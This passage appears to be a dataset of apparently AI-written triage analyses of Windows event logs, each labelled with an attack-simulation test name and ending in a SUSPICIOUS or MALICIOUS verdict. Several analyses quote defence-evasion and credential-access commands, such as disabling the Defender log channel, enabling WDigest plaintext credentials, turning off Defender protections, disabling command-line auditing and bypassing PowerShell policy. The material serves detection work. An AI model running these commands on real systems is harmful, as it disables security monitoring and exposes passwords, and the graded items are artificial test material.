- Sysmon logs show use of diagnostic tools like `wevtutil.exe`, `conhost.exe`, `hostname.exe`, and `cmd.exe` by `admin_test`. While these can indicate system enumeration or management, they are standard Windows administrative tools.
- Command execution using `cmd.exe` to modify registry settings for RDP (`reg add ...`) is concerning. This could be seen as suspicious as it alters the RDP initial program settings, which could be used for backdoor access.
- Microsoft's EdgeUpdate processes running with System-level authority could indicate legitimate software updates unless further context suggests unusual timing or frequency.

### Analysis
- **Suspicious Registry Changes**: The command line indicating registry modifications for RDP settings by `admin_test` is particularly concerning. Registry changes involving RDP can be used to configure persistent access mechanisms or backdoors.
- **Privilege Escalation and Logons**: The elevated privileges and NTLM logins for `admin_test` need additional scrutiny. It’s crucial to verify if this user action was expected or matches authorized administrative behavior.

### Conclusion
Based on the collected evidence, the most significant indicators pertain to registry modifications related to RDP settings, and the elevated privileges for `admin_test`. These events should be further investigated.

**Resolution: SUSPICIOUS**
- Recommend conducting a detailed investigation to determine whether the `admin_test` activities align with legitimate usage policies.
- Review user `admin_test` account activities and verification mechanisms (e.g., MFA logs, user access reviews).
- Examine the source and context of the command alterations in the registry, focusing on potential unauthorized remote access setups.
- Verify the integrity and legitimacy of Microsoft EdgeUpdate processes to rule out any potential threats masquerading as legitimate updates."
LockBit Black - Disable the ETW Provider of Windows Defender -cmd,"In analyzing the provided Windows event logs, I focused on identifying any patterns or indicators of malicious activity such as unusual process execution, suspicious command-line arguments, and any actions potentially indicative of privilege escalation or compromise.

### Anomalous Behaviors and Indicators

1. **Execution of ""reg"" via ""cmd"":**
   - The execution of `cmd.exe` with a command line to modify the registry (HKLM path relating to Windows Defender) is a potential indicator of malicious intent or misconfiguration. The command `reg add ""HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\WINEVT\\Channels\\Microsoft-Windows-Windows Defender/Operational"" /v Enabled /t REG_DWORD /d 0 /f` suggests disabling the event channel for Windows Defender logs, which could be an attempt to evade detection.
   
2. **Use of ""reg.exe"" and ""cmd.exe"":**
   - The combined use of command-line tools like `cmd.exe` and `reg.exe` to modify sensitive parts of the system configuration, especially security-related settings, is suspicious.

3. **Execution Context:**
   - These actions are executed under a user account `SERVER002\\admin_test` with high integrity level, suggesting they potentially have elevated privileges.

4. **Process Ancestry:**
   - This suspicious operation began with `wsmprovhost.exe`, a legitimate Windows process, which might have been leveraged to execute the command indirectly.

5. **Impactful Action:**
   - Disabling the logging for Windows Defender could be a significant step in a malicious playbook to hide further malicious activities by reducing the system's logging visibility.

### Assessment

- The execution of the registry command to disable Windows Defender logging stands out as the most suspicious and potentially malicious activity in this analysis. 
- Given the potential intent to disable logging, it suggests the presence of an advanced actor attempting to conduct operations on the system without detection.

### Recommended Actions

1. **Immediate Investigation:**
   - Conduct further investigation to determine the origin and authorization of the command.
   - Assess other system logs and configurations for signs of tampering or additional suspicious activities.

2. **Validation:**
   - Check for other changes in Windows Defender configurations and ensure its services are indeed operational and logging is re-enabled if disabled.

3. **Incident Response:**
   - If not already part of a scheduled task or script, isolate the system to prevent further actions by a potential attacker.
   - Consider this as a security incident; perform necessary forensic analysis on the affected system.

4. **Review Permissions:**

Based on the detected anomaly and its potential implications, the final resolution is **MALICIOUS**. The observed actions appear to be targeted attempts to disable system defenses, indicative of malicious manipulation."
Add domain to Trusted sites Zone,"### Detailed Analysis

**1. Application Logs:**
- The `Microsoft-Windows-Security-SPP` event is related to the Software Protection Platform, which is a normal service ensuring the integrity of licensed software. This, in itself, does not indicate any malicious activity.

**2. Windows PowerShell Logs:**
- The PowerShell logs indicate the execution of a script involving modification of the system registry. The script aims to add entries to `ZoneMap` for a domain `bad-domain.com` and its subdomain `bad-subdomain`. This type of action can be indicative of an attempt to manipulate browser security settings, which is associated with malicious activities like attempting to bypass browser protections or facilitate unauthorized network access. The presence of `bad-domain.com` is highly suspicious.

**3. Sysmon Logs:**
- Multiple sysmon events are logged for processes related to Microsoft Edge Update, which generally aligns with regular system updates. However, they are executed under `NT AUTHORITY\SYSTEM`, showcasing they are likely performing privileged operations, which is normal behavior for updates.
- A sequence of `whoami.exe` and `hostname.exe`, as well as `conhost.exe` execution, are logged under `SERVER002\admin_test` account which could suggest some command-line operations potentially for reconnaissance purposes. However, these actions alone are not enough to drastically indicate malicious activity but could be a part of normal administrative tasks.

### Assessment and Guidance

- **Suspicious PowerShell Activity:** The logs detailing PowerShell activity to adjust registry keys involving potentially malicious domains (`bad-domain.com`) signify considerable suspicious behavior. This could facilitate phishing attacks or unwanted application behavior by lowering security settings.
- **Normal Edge Update Activity:** While many operations for Microsoft Edge Update are logged, these appear to be consistent with expected behavior for legitimate update installations and do not immediately suggest malicious activity.
- **Administrative Actions:** The execution of common administrative tools like `hostname.exe` and `whoami.exe` by `admin_test` user account could either be legit administrative tasks or part of an active administration or potential lateral movement by an intruder. Context and user verification would be necessary.

### Resolution

**Resolution: SUSPICIOUS**

The context involving PowerShell manipulations of the registry related to `bad-domain.com` stands out as suspicious activity that warrants further investigation. It is advisable to:
- Verify the legitimacy of the `bad-domain.com` usage and associated changes through network monitoring or users' communications.
- Investigate the source of the script execution and review user activity logs to determine if unauthorized access or actions were taken by insider threat actors.
- Consider scanning the system for malware or indicators of compromise related to registry alterations in browser zone settings to confirm or rule out any unauthorized persistence mechanism or policy avoidance.

Security monitoring should be heightened and a thorough investigation into the account `admin_test` should be performed to validate if the observed actions correlate to legitimate administrative tasks or unauthorized access."
Tamper with Windows Defender ATP using Aliases - PowerShell,"Upon an in-depth review of the provided Windows event logs, I have identified a few noteworthy observations:

1. **System Time Changes**:
   - The System logs include EventID 24 and 1 from the Microsoft-Windows-Kernel-General provider, indicating changes in the system time. This is consistent with the corresponding Security log entries (EventID 4616) reflecting time changes as well. Adjustments to system time can be routine, but if unexpected, they may indicate an attempt to manipulate system logs or bypass certain security mechanisms.

2. **PowerShell Activity**:
   - The Sysmon logs demonstrate that a PowerShell command was executed by the user ""SERVER002\\admin_test"", with a command line involving the use of `Set-MpPreference` to modify Windows Defender settings. The arguments `-drtm $True`, `-dbm $True`, `-dscrptsc $True`, and `-dbaf $True` suggest that certain protections such as real-time monitoring, behavior monitoring, script scanning, and archive scanning were potentially disabled. Disabling these features is a red flag and may indicate malicious intent, where the user is attempting to avoid detection.

3. **Security Product Status**:
   - Application logs indicate the state of Windows Defender was snoozed (multiple entries of SECURITY_PRODUCT_STATE_SNOOZED). This aligns with the suspicious PowerShell activity that sought to modify Defender settings.

4. **Process Execution Contexts and Privilege Escalation**:
   - Events showing the execution of multiple instances of `svchost.exe`, `wevtutil.exe`, `conhost.exe`, and other benign processes were logged, mostly in the context of SYSTEM or LOCAL SERVICE users. These are legitimate processes in many cases but should be monitored when associated with suspicious activities like time changes or disabling of security settings.

5. **User Privileges**:
   - Security logs captured privilege assignment EventID 4672, showing elevated privileges for ""admin_test."" The privileges SeDebugPrivilege and others might be leveraged to perform actions commonly associated with advanced persistent threats, such as service creation, debug programs, or impersonate users.

**Assessment Summary**:
Given the activity logs, especially the disabling of Windows Defender's protective features and modifications to system time, these actions might be part of a broader strategy to obfuscate attack artifacts or prepare the system for additional unauthorized activities.

**Resolution**: **MALICIOUS**

**Guidance on How to Proceed**:
- **Enable and Reconfigure Security Protections**: Immediately revert any changes made to Windows Defender settings and ensure comprehensive malware/antivirus scans are conducted.
- **Time Synchronization**: Confirm that system time is correctly synchronized with a trusted time source and investigate potential further incidents.
- **Review User Activities**: Validate the actions of the user ""admin_test"" and correlate with access logs for unauthorized or suspicious behaviors.
- **Audit System Configurations**: Check for unauthorized changes to system settings or configurations.
- **Consider a Thorough Forensic Investigation**: Given the potential sign of compromise, initiate a detailed forensic analysis to determine the extent of any breach and remediate accordingly."
Modify registry to store logon credentials,"Upon analyzing the provided log entries, we can observe a few noteworthy points that may suggest suspicious or malicious activity:

1. **Time Change Events:**
   - In the Security logs, there are Event ID 4616 entries indicating a change in system time initiated by the svchost.exe process running under the LOCAL SERVICE account. This is accompanied by near-simultaneous time changes in the System logs. Time manipulation can sometimes be used by attackers to evade detection or align time-stamped entries for forensic confusion.
   - However, such changes could also occur as part of legitimate system time synchronization activities. 

2. **Registry Modification:**
   - In the Sysmon logs, we see a `cmd.exe` process executing the command: `reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f`. Modifying this registry setting enables storing plaintext passwords in memory, which is a common technique used in credential dumping attacks.
   - Such changes to WDigest settings are strongly associated with malicious intent or preparation for subsequent attacks.

3. **Process Execution Patterns:**
   - Multiple instances of `wevtutil.exe` and `conhost.exe` are launched in rapid succession by a user account SERVER002\admin_test. This frequent spawning of utility processes in a short time span can be indicative of log clearing activity or command execution through a script that may involve an administrative user’s sessions, which should be investigated further.

4. **Use of `whoami.exe`:**
   - Execution of `whoami.exe` may indicate attempts to assess current user privileges. This tool is often used by attackers to determine the context in which their code is running.

5. **Presence of Microsoft Edge Update Activities:**
   - There are multiple entries related to Microsoft Edge Update (`MicrosoftEdgeUpdate.exe`), which are quite regular as part of legitimate software updates. Still, combined with other findings, they may warrant deeper investigation as an attacker might leverage legitimate processes for execution or persistence.

**Guidance and Assessment:**
- Although many logs can be benign, the registry modification indicates possible malicious intent. 
- I recommend conducting a further investigation into recent administrative activities, particularly those involving SERVER002\admin_test, and reviewing the necessity and source of the registry modification.
- Check integrated security solutions for alerts triggered during the related timeframes or any additional logs indicating lateral movement or network anomalies.
- Assess if system time changes align with legitimate network time synchronization or if there's any indication of malicious manipulation.

Based on this analysis, given the identified registry modification and demand for further exploration into administrative actions and privileged accounts, the final assessment would be:

- **MALICIOUS** - The activity observed, particularly with the WDigest registry modification, aligns closely with preparation for credential dumping, which is a noteworthy indicator of compromise."
Disable Windows Change Password Feature,"**Detailed Analysis:**

The collection of Sysmon, Application, Security, System, and PowerShell logs provided presents various events from a Windows host. The analysis focuses on detecting any suspicious or malicious activities. 

**Suspicious or Anomalous Behavior:**

1. **Registry Modification Attempt:**
   - A `cmd.exe` process was executed with the command `reg add ""HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System"" /v DisableChangePassword /t REG_DWORD /d 1 /f`. This command alters the registry to potentially disable password changes, which is a known tactic for certain malware to maintain persistence. This activity is logged as `ProcessId: 7124`.

2. **Unusual Process Execution:**
   - The consistent execution and spawning of `wevtutil.exe` and `conhost.exe` processes by the same user, `SERVER002\admin_test`, can be seen. While the use of these processes is not inherently malicious, abnormal frequency could denote script or malicious tool usage.
   
3. **Time Synchronization Event:**
   - The series of events related to time changes in the logs (`EventID 4616` and related log entries), suggests either a misconfigured time service or intentional alteration of system time. This can sometimes indicate attempts to disrupt log reliability.

4. **Sysmon Events:**
   - Multiple executions related to Microsoft Edge Update processes suggest a series of legitimate software updates. While detailed scrutiny is required, the entropy in the CommandLine arguments for processes like `MicrosoftEdgeUpdate.exe` should be analyzed further for signs of tampering.

**Potential Malicious Activity or Compromise:**

- The explicit attempt to modify the Windows Registry through a command line (cmd.exe) to potentially disable changing passwords is a notable red flag. Such action, particularly when executed with high integrity, raises concerns and requires further investigation.
- Privilege exploitation may be indicated by the presence of very high-integrity level processes, especially when paired with registry manipulations.
  
**Assessment of the Situation:**

The activities recorded in the logs exhibit characteristics of both benign and potentially dubious activities. The registry modification attempt is suspicious and requires additional investigation to determine intent and origin. The evidence does not fully confirm a breach, but it hints at potential attempted persistence or system manipulation.

**Threats or Risks Identified:**

- Potential unauthorized registry modifications which may weaken system security.
- Possible manipulation of time settings could affect log integrity and make tracing other malicious actions more complex.

**Guidance on How to Proceed:**

1. **Further Investigation:**
   - Perform a root-cause analysis of the registry modification attempt.
   - Verify if similar commands have been executed in the past via remote services or scripts.
   - Check user activities and network connections around the times of the events, especially `admin_test`.

2. **System Audit:**
   - Review the security configuration and access privileges to ensure they adhere to least privilege principles.
   - Ensure that system time settings are correctly managed and audit logs for any similar discrepancies.

3. **Monitor for Persistence Mechanisms:**
   - Continuously monitor for any unauthorized registry modifications and process spawns particularly `whoami.exe`, `wevtutil.exe`, and `conhost.exe`.

4. **Communication and Mitigation:**
   - Notify relevant stakeholders of the potential findings.
   - Implement additional alerting for any subsequent execution of suspicious commands.

**Resolution:** **SUSPICIOUS**

While no direct malicious actions were confirmed, the registry manipulation attempt and other behaviors indicate the necessity for deeper investigation to ensure system integrity and security."
Launches an executable using Rundll32 and pcwutl.dll,"After examining the provided logs, let's analyze the various types of activity captured:

### Windows PowerShell log
- **Observation:** The PowerShell log is empty, meaning there's no evidence of any PowerShell execution, which could potentially indicate malicious activity.

### System log
- **Observation:** The System log primarily contains time change events and kernel operations. The time change events (`EventID: 1`) executed by `svchost.exe` are related to the system-level operations and do not immediately suggest malicious behavior. The involvement of `svchost.exe` and `time.windows.com` NTP server implies normal Time Synchronization tasks.
  
### Sysmon log
- **Observation:** 
  - The `MicrosoftEdgeUpdate.exe` and related COM registration (`MicrosoftEdgeUpdateComRegisterShell64.exe`) are consistently running as `NT AUTHORITY\SYSTEM`, which is expected behavior for software updates. 
  - `Whoami.exe` and `Hostname.exe` executions are seen, originated from `wsmprovhost.exe`, potentially indicating admin actions to check configuration or identity. Such commands are typical but can be used maliciously if not expected in the normal behavior context.
  - `Rundll32.exe` launching `notepad.exe` is somewhat unusual but can be legitimate. Typically `rundll32.exe` is used for launching DLLs as an executable, and using it to launch Notepad might suggest a scripted action. This does not directly indicate malicious intent by itself but should be treated with some caution if there are no legitimate use cases observed.

### Application log
- **Observation:** The logs mention `edgeupdate`, which is stopping services. This is common during software update tasks, particularly related to Microsoft Edge. There's nothing inherently suspicious about this based on the event details.

### Security log
- **Observation:** 
  - Several entries indicate a user (`admin_test`) logging in with elevated privileges (`EventID: 4672`) using the NTLM protocol from a remote workstation. This login, combined with the granted privileges (`SeDebugPrivilege`, etc.), is potentially concerning if unexpected, as it can be used to extract or manipulate information, bypass protections, and escalate privileges. 
  - The presence of `LogonType 3` indicates a network logon, which, when coupled with NTLM use, is suspicious for potential credential relay or pass-the-hash attacks especially if not typical for this user in the environmental context.

### Assessment and Resolution:
- **Assessment:** The combination of `rundll32.exe` executions, elevated privilege usage under NTLM logins, and `wsmprovhost.exe` interactions could indicate malicious testing or reconnaissance activity, especially if not aligned with expected administrative processes and workflows. The use of certain command-line process invocations should be validated against known and expected administrative activities.

- **Resolution:** **SUSPICIOUS**

### Guidance:
1. **Verify User Activity:** Investigate the purpose and necessity of `admin_test` carrying out these activities, including the use of elevated privileges through NTLM.
2. **Examine Context:** Check whether this behavior aligns with expected administrative actions or recent legitimate changes in user roles.
3. **Network Forensics:** Investigate potential lateral movement or unauthorized access originating from the identified remote workstation (`DESKTOP-3HL5B2P`).
4. **Determine Validity:** If these actions are unfamiliar, consider investigating for potential credential theft or unauthorized access.

This ensures any gap or misalignment between the user's expected actions and observed behavior is effectively assessed."
Delete Microsoft Defender ASR Rules - InTune,"Based on the provided Windows event logs, the analysis shows the following activities and anomalies:

### Key Observations:

1. **Time Changes:**
   - In the System log, there are events indicating time changes on the system (`EventID 24` and `4616`). The time is being adjusted backward by svchost.exe, a legitimate system process used for hosting services. While time changes can sometimes be indicative of malicious activity such as anti-forensics, this event alone is not a conclusive indicator of compromise.

2. **PowerShell Activity:**
   - The logs indicate the use of PowerShell to manipulate Registry entries related to Windows Defender (`ASRRules`). The PowerShell script is creating, modifying, and deleting keys in the Windows Defender Policy Manager. This activity can be suspicious as modifications to security-related settings like ASR (Attack Surface Reduction) rules could be an attempt to weaken security postures. The script execution was from a high-integrity level account, ""SERVER002\\admin_test,"" pointing to potentially unauthorized administrative activity.

3. **Suspicious Administrative Activity:**
   - Multiple instances of the `wevtutil.exe` and `conhost.exe` processes are observed being run by the ""SERVER002\\admin_test"" user. While these utilities are used for managing Windows event logs and console windows, their use in rapid succession, coupled with PowerShell activities, may suggest potentially suspicious administrative behavior.

4. **Edge Update Process:**
   - Frequent executions of `MicrosoftEdgeUpdate.exe` and associated processes are visible in the logs, appearing to perform updates or setups. This is expected behavior for updates; however, the frequency and rapid succession of these processes do not appear typically suspicious given current legitimate update scheduling.

### Assessment:

- **Benign Activities:**
  - The Microsoft Edge Update processes appear consistent with routine update activity and do not show signs of malicious behavior.

- **Suspicious Activities:**
  - The PowerShell activity modifying security-related settings may need further investigation. While the use of administrative credentials for these changes is not inherently malicious, it raises a flag for potential misuse of administrative privileges.
  - The time change events, though legitimate processes are involved, should be cross-referenced with any organizational policy on time server usage and authorized system time adjustments.

### Resolution:
**SUSPICIOUS** - The logs contain activities that require further investigation to clarify the legitimacy of administrative actions, particularly concerning PowerShell script execution and registry modifications related to security settings.

### Guidance:
- **Investigate further the PowerShell script execution** by validating if this was an intentional and authorized change. Review user activity policies regarding registry changes to security configurations.
- **Examine user ""admin_test's"" activities** surrounding the use of `wevtutil.exe` and `conhost.exe` in combination with PowerShell, to confirm if these are part of regular administrative tasks or inappropriate access.
- **Audit system time changes** and correlate them against authorized system updates or maintenance windows, ensuring compliance with internal policies.

Depending on the outcome of these investigations, further actions such as containment, documentation, or user policy updates may be warranted."
Disable Windows Command Line Auditing using Powershell Cmdlet,"After analyzing the provided Windows event logs, let's break down the key considerations:

### Key Findings:

1. **Time Changes:**
    - The Security and System logs show multiple instances where the system time was set back temporarily by the `svchost.exe` process (`EventID 4616` in Security log and `EventID 1` in System log). While legitimate services sometimes adjust time, repeated and close-timed changes can suggest tampering or may be used to align timestamps for unauthorized actions. However, in this context, it doesn't definitively indicate malicious activity without additional context.

2. **PowerShell Usage:**
    - A PowerShell script executes a command to modify a registry key involved with audit settings: `New-ItemProperty -Path ""HKLM:Software\Microsoft\Windows\CurrentVersion\Policies\System\Audit"" -Name ""ProcessCreationIncludeCmdLine_Enabled"" -Value 0 -PropertyType DWORD -Force -ErrorAction Ignore`. The intention appears to be to suppress audit logging command line arguments for process creation.
    - The modification to such audit policies could point towards potential malicious intent to cover tracks or reduce evidence visibility, which is noteworthy, especially since PowerShell is a common tool for attackers due to its robust capabilities.

3. **Process Execution Pattern:**
    - There are multiple instances of `conhost.exe` and `wevtutil.exe` being executed by the user `SERVER002\admin_test`, which may suggest batch script or automation in action. However, `wevtutil.exe` is typically used to query event logs or to back them up. Regular repetitive execution should be assessed to ensure it's aligned with legitimate administrative actions or scripts.
    - Additional processes such as `hostname.exe`, `whoami.exe`, and actions related to Microsoft Edge Update show typical system update behavior; these are standard update processes and not inherently malicious.

4. **Microsoft Edge Update:**
    - The logs show extensive activity related to Microsoft Edge Update, with multiple instances of processes related to update operations. These activities align with typical product updates and aren't directly indicative of malicious activity, especially considering involvement of `NT AUTHORITY\SYSTEM`.

### Assessment Summary:

- The repeated adjustment of system time is flagged as unusual but not definitively malicious on its own without corroborating evidence.
- The PowerShell activity involving the suppression of audit logging settings is suspicious and suggests the possibility of attempts to hide further actions or maintain persistence without detection.
- There is no explicit evidence of rudimentary malware indicators like unknown executables, indicators of persistence mechanisms, or unexplained network connections in the provided logs.
- The activity related to Microsoft Edge Update seems regular and in accordance with system update routines.

### Conclusion and Recommendation:
- **Resolution: SUSPICIOUS.** The action involving PowerShell and audit setting changes merits further investigation.
- **Next Steps:**
  - Investigate the user's intent and the context of the PowerShell command execution.
  - Check if there are additional scripts or scheduled tasks associated with `admin_test` to understand potential automation or batch operations.
  - Conduct a detailed review of the targeted registry path and any potential impact on security logging or monitoring.
  - Correlate this activity with any unusual network connections or file modifications during the time windows identified.

Further analysis should aim to contextualize this behavior within normal operations or identify it as part of an advanced persistent threat (APT) or insider threat scenario."
Disable Remote Desktop Anti-Alias Setting Through Registry,"After analyzing the provided Sysmon logs, here's a detailed breakdown of any suspicious or anomalous behaviors:

### Observations and Analysis:

1. **Frequent Execution of Monitoring Commands**:
   - The logs show several instances of `whoami.exe`, `hostname.exe`, and `wevtutil.exe` being executed. 
   - These commands are often used legitimately for diagnostics. However, persistent use may imply a reconnaissance activity by a user or script to gain situational awareness on the system.

2. **Unexpected Execution Contexts**:
   - The command `CMD.exe /c reg add ...` with a modification of registry settings, specifically targeting `HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows NT\Terminal Services`, could be indicative of a misconfiguration or an attempt to alter RDP settings.
   - High integrity level for the `cmd.exe` executed by `admin_test` user implies privilege handling which could potentially be risky if misused or if the account had been compromised.

3. **Multiple Process Instances**:
   - Several instances of `conhost.exe` are spawned linked with the execution of console applications. While `conhost.exe` is normal, its repeated invocation linked to processes like `whoami.exe` and `wevtutil.exe` signifies potential script-driven activity or automation.

4. **Applications Executed by SYSTEM or Unattended**:
   - `MicrosoftEdgeUpdate.exe` and its variants are being triggered by SYSTEM, which could be legitimate if related to a scheduled task. Still, it's important to verify no unusual paths or versions are being executed.
   - Normal instances of `svchost.exe` or `WmiPrvSE.exe` running under `NT AUTHORITY\SYSTEM` are standard for Windows services.

5. **Registry Modifications**:
   - Adding registry keys as seen in the logs, especially without user notification or logging, could be suspicious. It's necessary to confirm if these modifications were part of an authorized administrative task.

### Threat Assessment:

- **BENIGN Activity**: Most entries don't encompass typical malicious indicators such as known malware process names or hashes.
- **SUSPICIOUS**: The registry modification using `reg.exe` combined with high frequency execution of diagnostic tools and services necessitates further inspection to rule out scripting based attacks or system misconfiguration.
- **Potential Risks**: If these activities are unauthorized, they indicate unauthorized probing and/or misconfigurations that could eventually lead to a vulnerability or misuse if not assessed.

### Guidance:

1. Ensure there's an audit of `admin_test` activities to confirm all actions were authorized.
2. Examine any scripts or automated tasks under `admin_test` to validate their purpose and legitimacy.
3. Review changes made through Windows Registry to ensure consistency with organizational policies.
4. Check for unusual patterns or alterations in the SYSTEM configuration or other services during the noted timestamps.

**Resolution**: **SUSPICIOUS** - While no absolute malicious activity is confirmed from the logs provided, the nature and context of some activities suggest a closer investigation is warranted to rule out any unauthorized system interaction or configuration changes."
Change Powershell Execution Policy to Bypass,"### Analysis of Windows Event Logs

#### Overview
I carefully reviewed the provided Windows event logs to identify any indicators of malicious activity. The logs include various Sysmon, Application, System, Security, and PowerShell-related events. My analysis focused on suspicious behavior indices such as unusual process executions, command-line arguments, privilege escalations, and potentially compromised accounts.

### Detailed Observations

1. **Sysmon Logs:**
   - Numerous events involve `wevtutil.exe` and `conhost.exe`, which are legitimate Windows processes commonly used for event log manipulation and console applications, respectively. They are executed by the user `SERVER002\admin_test`.
   - There are instances of `powershell.exe` running with the command line argument to set the execution policy to bypass (`Set-ExecutionPolicy -ExecutionPolicy Bypass -Scope LocalMachine`). This action can potentially allow execution of unsigned scripts and is considered suspicious, especially without proper change management documentation.
   - Usage of `whoami.exe` and `hostname.exe`, which are benign processes under usual circumstances, were observed as well.
   - Multiple activities related to `MicrosoftEdgeUpdate.exe`. These relate to edge updates and appear consistent with legitimate application updates.

2. **Application Logs:**
   - Logs related to `edgeupdate` service starting and stopping are observed, which align with legitimate update checks and installations for Microsoft Edge.

3. **System Logs:**
   - Events related to time changes are present (`svchost.exe` adjusting system time), which can occur during legitimate time synchronization activities.

4. **Security Logs:**
   - Recorded events include time changes attributed to `LOCAL SERVICE` which are consistent with system time adjustments observed in other logs.

5. **Windows PowerShell Logs:**
   - The execution of PowerShell commands indicates a change of execution policy to `Bypass`. Such behavior can be exploited for executing potentially harmful scripts without restrictions.

### Assessment

The logs predominantly contain activity that, while might appear suspicious at a glance (e.g., execution policy changes in PowerShell), could be part of routine administration if conducted with documented justification and appropriate permissions. However, setting execution policies to Bypass, particularly when executed without documented administrative control, requires further attention to ensure compliance with security policies.

### Final Resolution

**SUSPICIOUS**

Though there is no unequivocal evidence of malicious activity, the use of PowerShell with execution policy set to bypass warrants further investigation to ensure no security policy was violated and no unauthorized scripts were executed. It is recommended to:

- Check with the system administrators to confirm if these actions were intentional and aligned with maintenance or administrative tasks.
- Verify the legitimacy of the executed scripts and ensure they are approved and documented.
- Review any recent changes to security policies or permissions associated with the `SERVER002\admin_test` account.
- Ensure system logging and monitoring are enhanced to capture detailed PowerShell activities for future reference.

By examining the context of these activities, any potential security concerns can be addressed promptly."
Create and start Hyper-V virtual machine,"**Analysis of Event Logs:**

1. **Windows PowerShell Logs:**
   - The logs indicate a PowerShell session was initiated to create a virtual machine (VM). The sequence involves shutting off secure boot and starting the VM using the following command: `powershell.exe & {$VM = ""file VM"" New-VM -Name $VM -Generation 2 Set-VMFirmware $VM -EnableSecureBoot Off Start-VM $VM}`.
   - **Observation:** 
     - Creating VMs through PowerShell is a common administrative task, but executing scripts that modify VM firmware settings, particularly disabling secure boot, can be suspicious without context. The command is executed by ""SERVER002\admin_test"", which indicates administrative privileges.
     - Given that this activity involves potential alteration of system security settings, it should be treated cautiously. However, without additional context about the necessity or source of this operation, labeling it outright as malicious might be premature.

2. **System Logs:**
   - System logs indicate time adjustments and syncs with an NTP server (time.windows.com), which are normal operations for server time corrections.
   - **Observation:**
     - These logs don't show indications of malicious activity. Time synchronization with a known server is typical.

3. **Security Logs:**
   - Security logs related to time change adjustments are consistent with the system logs, noting a change made by the svchost process.
   - **Observation:**
     - No direct indication of malicious activity is observed.

4. **Sysmon Logs:**
   - Sysmon logs indicate several processes run by ""NT AUTHORITY\SYSTEM"" and ""SERVER002\admin_test"".
   - The Microsoft Edge Updater is seen several times, with normal update operations.
   - There are additional logs indicating ""wevtutil.exe"" and other typical administrative processes executed.
   - **Observation:** 
     - While several processes execute PowerShell, updates, and system utilities, these actions are naturally part of the system’s operation and maintenance.
     - Repeated execution of the wevtutil.exe (an event log utility) by the user ""admin_test"" might require verification to ensure it aligns with authorized administrative actions.

**Assessment and Resolution:**

- The PowerShell commands used to modify VM settings warrant attention for potential policy violation or misconfiguration. Additional checks with the system or enterprise’s change management records could clarify intent.
- The use of wevtutil.exe by admin_test should be reviewed to ensure these commands align with standard administrative practices.

**Resolution: SUSPICIOUS**

- The activity regarding the modification of VM settings and use of administrative tools seems out of scope without proper context or authorization. This requires further investigation to verify the legitimacy of these actions and validate they were performed under authorized conditions.


**Guidance:**
- Investigate the context and necessity for the PowerShell command to disable secure boot and start a VM. Confirm with the system administrator or IT staff if this is a recognized activity.
- Validate the permissions and intention behind the use of ""wevtutil.exe"" by ""admin_test"" to ensure it is consistent with allowed and necessary maintenance tasks.
- If unauthorized activity is suspected, consider enhancing monitoring on the Server002 or engaging further forensic analysis to ensure no security policies have been violated."
CMSTP Executing Remote Scriptlet,"Upon analyzing the provided logs, here are my findings:

### Application Log

1. **Edge Update Service**:
   - Multiple entries indicate the `edgeupdate` service was stopped. However, there is no clear indication of abnormal behavior solely from stopping a service, which could happen during routine updates or maintenance activities.

2. **Software Protection Platform Service**:
   - An entry from the `Microsoft-Windows-Security-SPP` suggests normal service logging with no evident anomalies or security concerns.

3. **Security Product State**:
   - Multiple notifications of Windows Defender being in the `SECURITY_PRODUCT_STATE_ON` state is expected for a security service. This indicates that Windows Defender is active and appears operational.

### Sysmon Log

1. **PowerShell Execution**:
   - A PowerShell execution is logged under the user `SERVER002\admin_test`. While PowerShell can be used for legitimate administrative tasks, it's also frequently used in attacks. However, the absence of a specific script or command being executed here limits further immediate suspicion.

2. **Wevtutil Executions**:
   - The `wevtutil.exe` is used to manage Windows events. Frequent or unusual use may indicate an attempt to tamper with logs, but in this instance, there is no context to suggest it's malicious.

3. **Processes Like WHOAMI, Hostname**:
   - Execution of `hostname.exe` and `whoami.exe` recorded without context doesn’t appear inherently malicious but may be used within scripts or procedures to gather system information.

4. **Cmd and CMSTP**:
   - The use of `cmd.exe` to run `cmstp.exe` could be concerning. `Cmstp.exe` has been used in living-off-the-land attacks for bypassing UAC or other unauthorized executions. The path leads to a temporary directory, which warrants further scrutiny to ensure no unauthorized file delivery or script was executed.

5. **Edge Update Process**:
   - Numerous entries correlate with Microsoft Edge Update, which seems consistent with normal update behavior. The processes run under the `NT AUTHORITY\SYSTEM`, indicating they likely possess elevated privileges.

### Security Log

1. **Logon and Privilege Use**:
   - Log entries showing a SYSTEM account logon and granting privileges like `SeDebugPrivilege` are standard activities during system startup or service operations. Each repeated entry immediately follows another identical successful logon, which seems redundant but not unusual if the system is booting or services are initializing.

### Conclusion

The presence of the `cmstp.exe` command being triggered from a temporary path deserves further investigation due to past reports of its use in malicious activities to bypass security controls. This command might have been executed in malicious context or as part of legitimate software installation procedures. 

Based on the overall review, the activities around `cmstp.exe` are concerning, and this, combined with regular service logs, suggest some level of scrutiny is warranted.

### Resolution

- **SUSPICIOUS** - The logs contain potentially suspicious activity that may warrant further investigation, particularly around the use of `cmstp.exe`. It's advisable to check the files involved in this execution and assess whether any unauthorized configurations or scripts are in place. Further context or endpoints logs should be gathered to rule out or confirm malicious intent."
Suppress Win Defender Notifications,"After carefully analyzing the event logs provided, several key observations can be made to assess whether any malicious activity or anomalous behavior is present:

### Unusual Time Change Events
- **Event ID 4616 and Kernel-General Time Change Events**: 
  - There are events indicating that the system time was changed. This is a significant indication that something potentially suspicious might have occurred. An unauthorized time change can cover up tracks from malicious activity.
  
### Privilege Escalation and User Activity
- **Event ID 4672 and 4624**:
  - The ""admin_test"" account requested a series of high-level privileges, including `SeSecurityPrivilege`, `SeDebugPrivilege`, and others. While these privileges are not inherently malicious, their use should be closely monitored, especially if unexpected.
  - Following the acquisition of these privileges, there was a logon using NTLM from a remote IP address `192.168.0.102`. This remote login activity should be monitored and correlated with expected behavior.
  
### Sysmon Observations of Process Activity
- **Sysmon Events with Process GUIDs**:
  - Multiple executions of `wevtutil.exe` and `conhost.exe` were noted under the ""admin_test"" user. While `conhost.exe` is generally a legitimate process, its frequent execution in a short period, alongside other unusual activities, necessitates further examination.
  - **Cmd.exe and Registry Modification**: There is an event where `cmd.exe` is used to alter the Windows Defender configuration to suppress notifications using the command: 
